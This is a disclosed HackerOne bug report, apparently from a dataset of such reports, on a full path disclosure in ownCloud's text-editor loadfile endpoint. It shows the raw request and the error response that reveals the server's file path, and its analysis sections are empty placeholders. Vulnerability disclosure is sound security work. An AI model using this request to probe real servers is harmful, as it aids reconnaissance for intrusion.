---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '85201'
original_report_id: '85201'
title: Full Path Disclosure
weakness: Information Disclosure
team_handle: owncloud
created_at: '2015-08-27T14:18:56.726Z'
disclosed_at: '2016-01-06T05:15:47.163Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- information-disclosure
---

# Full Path Disclosure

## Metadata

- HackerOne Report ID: 85201
- Weakness: Information Disclosure
- Program: owncloud
- Disclosed At: 2016-01-06T05:15:47.163Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

When I was trying to load a file which is not actually exist then it shows 
{"message":"Could not obtain lock type 1 on \"\/opt\/lampp\/htdocs\/owncloud\/data\/admin\/files\/lol\"."}


Request 

GET /owncloud/index.php/apps/files_texteditor/ajax/loadfile?filename=lol HTTP/1.1
Host: 192.168.0.105
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
requesttoken: JsTZTCWPxW2INuw7Ur1bgkLlmwQY0a
OCS-APIREQUEST: true
X-Requested-With: XMLHttpRequest
Referer: http://192.168.0.105/owncloud/index.php/apps/files/
Cookie: ochwk513zixt=am12pvu6bbmi3u03jbbk64v5f2
Connection: keep-alive

Response 

HTTP/1.1 400 Bad request
Date: Thu, 27 Aug 2015 14:07:54 GMT
Server: Apache/2.4.16 (Unix) OpenSSL/1.0.1p PHP/5.6.11 mod_perl/2.0.8-dev Perl/v5.16.3
X-Powered-By: PHP/5.6.11
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Content-Security-Policy: default-src 'none';script-src 'self' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self';font-src 'self';connect-src 'self';media-src 'self'
Content-Length: 106
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Type: application/json; charset=utf-8

{"message":"Could not obtain lock type 1 on \"\/opt\/lampp\/htdocs\/owncloud\/data\/admin\/files\/lol\"."}




Thanks.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
